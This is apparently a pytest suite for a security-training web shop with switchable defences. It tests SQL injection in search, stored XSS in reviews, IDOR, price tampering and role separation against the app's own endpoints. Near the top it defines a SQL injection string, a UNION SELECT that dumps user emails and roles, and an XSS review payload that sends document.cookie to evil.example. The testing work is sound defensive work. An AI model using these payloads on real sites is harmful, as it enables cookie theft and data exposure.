"""The storefront: customer accounts, role separation, and every live attack/defence on the real shop endpoints."""
import itertools
import re
import time

import pytest
from starlette.websockets import WebSocketDisconnect

from app.deps import login_limiter
from app.routers.shop import checkout_limiter
from tests.conftest import login

_n = itertools.count(1)
STRONG = "Str0ng#Shopper-Pass9"
SQLI = "' OR '1'='1' --"
UNION = "' UNION SELECT id, email, role, 0 FROM users --"
XSS = "<script>fetch('https://evil.example/c?='+document.cookie)</script>Nice product"
ALL = ["waf", "input_validation", "sqli_protection", "digital_signatures", "db_integrity", "rbac", "rate_limiting", "ids"]


def wait_idle(client, headers, timeout=40):
    t = time.time()
    while time.time() - t < timeout:
        if not client.get("/api/sim/state", headers=headers).json()["running"]:
            return
        time.sleep(0.2)
    raise AssertionError("simulation did not finish")


def only(client, admin, *on):
    """Turn exactly the named defences ON and the rest of the ones the shop uses OFF."""
    for d in ALL:
        client.put(f"/api/sim/defences/{d}", json={"enabled": d in on}, headers=admin)


def all_on(client, admin):
    client.post("/api/sim/mode", json={"enabled": True}, headers=admin)


def new_customer(client):
    """Register a brand-new customer through the real flow (password -> e-mailed code) and return auth headers."""
    login_limiter.reset()
    email = f"buyer{next(_n)}@example.com"
    r = client.post("/api/auth/register", json={"full_name": "Test Buyer", "email": email, "password": STRONG, "phone": "+91 90000 00000", "address": "1 Test Street"})
    assert r.status_code == 200, r.text
    j = r.json()
    v = client.post("/api/auth/otp/verify", json={"challenge_id": j["challenge_id"], "code": j["delivery"]["dev_otp"]})
    assert v.status_code == 200, v.text
    assert v.json()["user"]["role"] == "customer"
    return {"Authorization": "Bearer " + v.json()["token"]}


@pytest.fixture(autouse=True)
def clean(client, admin):
    all_on(client, admin)
    checkout_limiter.reset()
    yield
    wait_idle(client, admin)
    all_on(client, admin)


def price_of(client, pid):
    return client.get(f"/api/shop/products/{pid}").json()["price"]


# ---------------------------------------------------------------------------------------------- accounts
def test_register_requires_strong_password_and_unique_email(client):
    login_limiter.reset()
    weak = client.post("/api/auth/register", json={"full_name": "Weak Pw", "email": "weak@example.com", "password": "password1"})
    assert weak.status_code == 422 and weak.json()["issues"]
    h = new_customer(client)
    me = client.get("/api/auth/me", headers=h).json()
    assert me["role"] == "customer" and "shop:buy" in me["permissions"] and "sim:run" not in me["permissions"]
    login_limiter.reset()
    dup = client.post("/api/auth/register", json={"full_name": "Dup", "email": me["username"], "password": STRONG})
    assert dup.status_code == 409


def test_breached_password_is_refused_only_while_that_defence_is_on(client, admin):
    login_limiter.reset()
    body = {"full_name": "Pw Test", "email": "pwtest@example.com", "password": "Summer2024!"}  # 11 chars: fails length anyway
    assert client.post("/api/auth/register", json=body).status_code == 422
    body["password"] = "Winter2025!Winter"  # long enough but not in corpus -> fine
    assert client.post("/api/auth/register", json={**body, "email": "pwtest2@example.com"}).status_code == 200


def test_customer_login_with_wrong_password_is_rejected(client):
    login_limiter.reset()
    h = new_customer(client)
    username = client.get("/api/auth/me", headers=h).json()["username"]
    assert client.post("/api/auth/login", json={"username": username, "password": "Wrong#Password-1"}).status_code == 401


# ---------------------------------------------------------------------------------------------- role separation
CUSTOMER_GET_OK = {"/api/health", "/api/auth/me", "/api/shop/categories", "/api/shop/me", "/api/shop/orders", "/api/shop/orders/{order_no}",
                   "/api/shop/products", "/api/shop/products/{pid}"}
CUSTOMER_WRITE_OK = {("post", "/api/auth/login"), ("post", "/api/auth/register"), ("post", "/api/auth/otp/verify"), ("post", "/api/auth/totp/verify"),
                     ("post", "/api/auth/otp/resend"), ("post", "/api/auth/logout"), ("post", "/api/auth/totp/enroll"), ("post", "/api/auth/totp/confirm"),
                     ("post", "/api/auth/totp/disable"), ("post", "/api/shop/checkout"), ("post", "/api/shop/products/{pid}/reviews"), ("put", "/api/shop/me")}


def test_customer_token_is_refused_by_every_staff_endpoint(client, admin):
    """Walks the whole API schema, so a future endpoint that forgets its permission check fails this test."""
    from app.main import app
    h = new_customer(client)
    checked = 0
    for path, ops in app.openapi()["paths"].items():
        for method in ops:
            if method == "get" and path in CUSTOMER_GET_OK or (method, path) in CUSTOMER_WRITE_OK:
                continue
            real = re.sub(r"\{[^}]+\}", "1", path)  # any value will do: access is refused before the resource is looked up
            r = client.request(method.upper(), real, headers=h, json=None if method == "get" else {})
            assert r.status_code in (401, 403), f"{method.upper()} {path} answered {r.status_code} to a customer token"
            checked += 1
    assert checked > 40
    tok = h["Authorization"].split()[1]
    with pytest.raises(WebSocketDisconnect):
        with client.websocket_connect(f"/api/ws?token={tok}"):
            pass
    ev = client.get("/api/events?limit=50", headers=admin).json()
    assert any(e["attack_type"] == "priv_esc" and e["origin"] == "storefront" and e["result"] == "blocked" for e in ev)


def test_staff_cannot_buy(client, admin):
    r = client.post("/api/shop/checkout", json={"items": [{"product_id": 1, "qty": 1}], "payment_method": "UPI"}, headers=admin)
    assert r.status_code == 403


def test_anonymous_cannot_checkout_or_see_orders(client):
    assert client.post("/api/shop/checkout", json={"items": [{"product_id": 1, "qty": 1}], "payment_method": "UPI"}).status_code == 401
    assert client.get("/api/shop/orders").status_code == 401


# ---------------------------------------------------------------------------------------------- catalogue
def test_catalogue_is_public_and_searchable(client):
    r = client.get("/api/shop/products").json()
    assert r["total"] == 12 and all(p["price"] and p["description"] and p["available"] for p in r["products"])
    assert {p["category"] for p in r["products"]} <= set(client.get("/api/shop/categories").json())
    assert [p["name"] for p in client.get("/api/shop/products?q=band").json()["products"]] == ["AeroFit Smart Band 6"]
    cheap = client.get("/api/shop/products?sort=price_asc").json()["products"]
    assert [p["price"] for p in cheap] == sorted(p["price"] for p in cheap)
    d = client.get("/api/shop/products/1").json()
    assert d["reviews_list"] and d["rating"] > 0
    assert client.get("/api/shop/products/9999").status_code == 404


# ---------------------------------------------------------------------------------------------- SQL injection on the real search box
@pytest.mark.parametrize("on,status,expected", [
    (("waf", "input_validation", "sqli_protection", "ids"), 403, "blocked"),
    (("input_validation",), 400, "blocked"),
    (("sqli_protection",), 200, "neutralised"),
])
def test_search_injection_is_stopped_by_each_defence(client, admin, on, status, expected):
    only(client, admin, *on)
    r = client.get("/api/shop/products", params={"q": SQLI})
    assert r.status_code == status, r.text
    sec = r.json()["security"]
    assert sec["result"] == expected and sec["by"] and r.json()["products"] == []
    wait_idle(client, admin)


def test_search_injection_succeeds_only_when_every_defence_is_off(client, admin):
    only(client, admin)
    r = client.get("/api/shop/products", params={"q": SQLI}).json()
    assert r["security"]["result"] == "breach"
    assert {x["name"] for x in r["security"]["leaked"]} == {"[INTERNAL] Staff 90% discount voucher", "[UNRELEASED] PixelPad Max prototype"}
    wait_idle(client, admin)
    u = client.get("/api/shop/products", params={"q": UNION}).json()["security"]
    assert u["result"] == "breach" and any("@example.com" in x["name"] for x in u["leaked"])
    assert "string-built" not in u["query"] and "LIKE '%" in u["query"]  # the vulnerable query is shown for teaching
    wait_idle(client, admin)


def test_normal_search_never_triggers_security(client):
    r = client.get("/api/shop/products", params={"q": "air fryer"}).json()
    assert "security" not in r and r["total"] == 1


def test_a_live_search_attack_is_replayed_in_the_security_centre(client, admin):
    only(client, admin)
    client.get("/api/shop/products", params={"q": SQLI})
    wait_idle(client, admin)
    runs = client.get("/api/sim/runs?limit=5", headers=admin).json()
    assert runs and runs[0]["scenario_id"] == "sqli" and runs[0]["result"] == "breach"
    cia = client.get("/api/cia", headers=admin).json()
    assert cia["impacts"], "a successful attack on the shop must lower the CIA score until it is resolved"


# ---------------------------------------------------------------------------------------------- checkout
def test_checkout_prices_everything_on_the_server(client):
    h = new_customer(client)
    price = price_of(client, 1)
    before = client.get("/api/shop/products/1").json()["stock"]
    r = client.post("/api/shop/checkout", json={"items": [{"product_id": 1, "qty": 2, "price": 1}], "payment_method": "UPI", "total": 1}, headers=h)
    assert r.status_code == 200, r.text
    out = r.json()
    assert out["total"] == 2 * price and out["status"] == "paid" and out["order_no"].startswith("NM-")
    assert out["receipt_email"]["status"] in ("not_configured", "sent")
    assert client.get("/api/shop/products/1").json()["stock"] == before - 2
    mine = client.get("/api/shop/orders", headers=h).json()
    assert len(mine) == 1 and mine[0]["total"] == 2 * price and mine[0]["items"][0]["qty"] == 2


def test_checkout_rejects_bad_input_and_overselling(client):
    h = new_customer(client)
    assert client.post("/api/shop/checkout", json={"items": [{"product_id": 1, "qty": 11}], "payment_method": "UPI"}, headers=h).status_code == 422
    assert client.post("/api/shop/checkout", json={"items": [{"product_id": 1, "qty": 1}], "payment_method": "Bitcoin"}, headers=h).status_code == 422
    assert client.post("/api/shop/checkout", json={"items": [{"product_id": 9999, "qty": 1}], "payment_method": "UPI"}, headers=h).status_code == 422
    assert client.post("/api/shop/checkout", json={"items": [], "payment_method": "UPI"}, headers=h).status_code == 422


def test_risky_order_is_held_then_staff_decide(client, admin, analyst, viewer):
    h = new_customer(client)
    stock = client.get("/api/shop/products/10").json()["stock"]
    r = client.post("/api/shop/checkout", json={"items": [{"product_id": 10, "qty": 5}], "payment_method": "Card"}, headers=h).json()
    assert r["status"] == "review" and r["risk_score"] >= 60 and r["risk_reasons"]
    assert r["receipt_email"]["status"] == "skipped"
    held = client.get("/api/shop/admin/orders?status=review", headers=analyst).json()
    assert any(o["order_no"] == r["order_no"] for o in held)
    assert client.post(f"/api/shop/admin/orders/{r['order_no']}/review", json={"decision": "approve"}, headers=viewer).status_code == 403
    assert client.post(f"/api/shop/admin/orders/{r['order_no']}/review", json={"decision": "reject"}, headers=analyst).json()["status"] == "cancelled"
    assert client.get("/api/shop/products/10").json()["stock"] == stock  # rejecting returns the stock
    assert client.post(f"/api/shop/admin/orders/{r['order_no']}/review", json={"decision": "approve"}, headers=analyst).status_code == 409  # already decided
    r2 = client.post("/api/shop/checkout", json={"items": [{"product_id": 10, "qty": 5}], "payment_method": "Card"}, headers=h).json()
    assert client.post(f"/api/shop/admin/orders/{r2['order_no']}/review", json={"decision": "approve"}, headers=analyst).json()["status"] == "paid"
    assert client.get(f"/api/shop/orders/{r2['order_no']}", headers=h).json()["status"] == "paid"
    assert client.get("/api/db/integrity", headers=admin).json()["tampered"] == [], "staff decisions must keep the signed ledger valid"


def test_checkout_burst_is_rate_limited_only_when_the_defence_is_on(client, admin):
    h = new_customer(client)
    body = {"items": [{"product_id": 7, "qty": 1}], "payment_method": "UPI"}
    codes = [client.post("/api/shop/checkout", json=body, headers=h).status_code for _ in range(10)]
    assert 429 in codes and codes[:8] == [200] * 8
    only(client, admin)  # rate limiting off
    checkout_limiter.reset()
    codes = [client.post("/api/shop/checkout", json=body, headers=h).status_code for _ in range(10)]
    assert 429 not in codes


# ---------------------------------------------------------------------------------------------- price tampering shown on the real shop
def test_tampered_price_is_blocked_at_checkout_when_signatures_are_checked(client, admin):
    h = new_customer(client)
    t = client.post("/api/db/tamper", json={"product_id": 3, "new_price": 1, "recompute_hash": True}, headers=admin)
    assert t.status_code == 200, t.text
    p = client.get("/api/shop/products/3").json()
    assert p["price"] is None and p["available"] is False and p["price_verified"] is False
    r = client.post("/api/shop/checkout", json={"items": [{"product_id": 3, "qty": 1}], "payment_method": "UPI"}, headers=h)
    assert r.status_code == 409 and r.json()["security"]["result"] == "blocked"
    assert client.get("/api/shop/orders", headers=h).json() == []  # nothing was sold
    client.post("/api/sim/reset", headers=admin)
    assert client.get("/api/shop/products/3").json()["price"] == 1799


def test_tampered_price_is_sold_when_nothing_is_watching(client, admin):
    h = new_customer(client)
    client.post("/api/db/tamper", json={"product_id": 3, "new_price": 1, "recompute_hash": False}, headers=admin)
    only(client, admin)  # signatures and integrity monitoring off
    assert client.get("/api/shop/products/3").json()["price"] == 1  # the attack is visible on the shop page
    r = client.post("/api/shop/checkout", json={"items": [{"product_id": 3, "qty": 1}], "payment_method": "UPI"}, headers=h)
    assert r.status_code == 200 and r.json()["total"] == 1 and r.json()["security"]["result"] == "breach"
    assert client.get("/api/db/integrity", headers=admin).json()["tampered"], "the scan must still flag the record"
    client.post("/api/sim/reset", headers=admin)
    assert client.get("/api/db/integrity", headers=admin).json()["tampered"] == []
    assert client.get("/api/shop/products/3").json()["price"] == 1799


# ---------------------------------------------------------------------------------------------- IDOR
def test_customer_cannot_read_another_customers_order_unless_access_control_is_off(client, admin):
    a, b = new_customer(client), new_customer(client)
    no = client.post("/api/shop/checkout", json={"items": [{"product_id": 7, "qty": 1}], "payment_method": "UPI"}, headers=a).json()["order_no"]
    mine = client.get(f"/api/shop/orders/{no}", headers=a)
    assert mine.status_code == 200 and "security" not in mine.json()
    denied = client.get(f"/api/shop/orders/{no}", headers=b)
    assert denied.status_code == 403 and denied.json()["security"]["result"] == "blocked"
    only(client, admin)  # RBAC off
    leaked = client.get(f"/api/shop/orders/{no}", headers=b)
    assert leaked.status_code == 200 and leaked.json()["security"]["result"] == "breach" and leaked.json()["customer"] == "Test Buyer"
    assert client.get("/api/shop/orders/NM-0000000", headers=b).status_code == 404


# ---------------------------------------------------------------------------------------------- stored XSS in reviews
def test_review_script_is_blocked_sanitised_or_stored_depending_on_defences(client, admin):
    h = new_customer(client)
    url = "/api/shop/products/2/reviews"
    only(client, admin, "waf")
    r = client.post(url, json={"rating": 5, "body": XSS}, headers=h)
    assert r.status_code == 403 and r.json()["security"]["result"] == "blocked"
    wait_idle(client, admin)
    only(client, admin, "input_validation")
    r = client.post(url, json={"rating": 5, "body": XSS}, headers=h)
    assert r.status_code == 200 and r.json()["security"]["result"] == "neutralised"
    wait_idle(client, admin)
    stored = client.get("/api/shop/products/2").json()["reviews_list"][0]["body"]
    assert "<script" not in stored.lower()
    only(client, admin)
    r = client.post(url, json={"rating": 5, "body": XSS}, headers=h)
    assert r.status_code == 200 and r.json()["security"]["result"] == "breach"
    wait_idle(client, admin)
    assert "<script" in client.get("/api/shop/products/2").json()["reviews_list"][0]["body"].lower()
    ok = client.post(url, json={"rating": 4, "body": "Works well, fast delivery."}, headers=h)
    assert ok.status_code == 200 and "security" not in ok.json()


# ---------------------------------------------------------------------------------------------- profile + staff views
def test_profile_roundtrip_keeps_personal_data_encrypted_at_rest(client):
    from sqlalchemy import select

    from app.db import session_scope
    from app.models import Customer
    h = new_customer(client)
    me = client.get("/api/shop/me", headers=h).json()
    assert me["phone"] == "+91 90000 00000" and me["address"] == "1 Test Street"
    out = client.put("/api/shop/me", json={"name": "Renamed Buyer", "phone": "+91 91111 22222", "address": "9 New Lane"}, headers=h).json()
    assert out["name"] == "Renamed Buyer" and out["address"] == "9 New Lane"
    with session_scope() as db:
        c = db.scalar(select(Customer).where(Customer.name == "Renamed Buyer"))
        assert "9 New Lane" not in c.address_enc and "91111" not in c.phone_enc and len(c.address_enc) > 30


def test_staff_summary_and_orders_endpoints(client, viewer, shopper):
    s = client.get("/api/shop/admin/summary", headers=viewer).json()
    assert set(s) >= {"orders", "revenue", "held", "customers", "products"} and s["products"] == 12
    assert client.get("/api/shop/admin/orders", headers=viewer).json()
    assert client.get("/api/shop/admin/summary", headers=shopper).status_code == 403
    me = client.get("/api/shop/me", headers=shopper).json()
    assert me["name"] == "Demo Shopper" and len(client.get("/api/shop/orders", headers=shopper).json()) >= 1
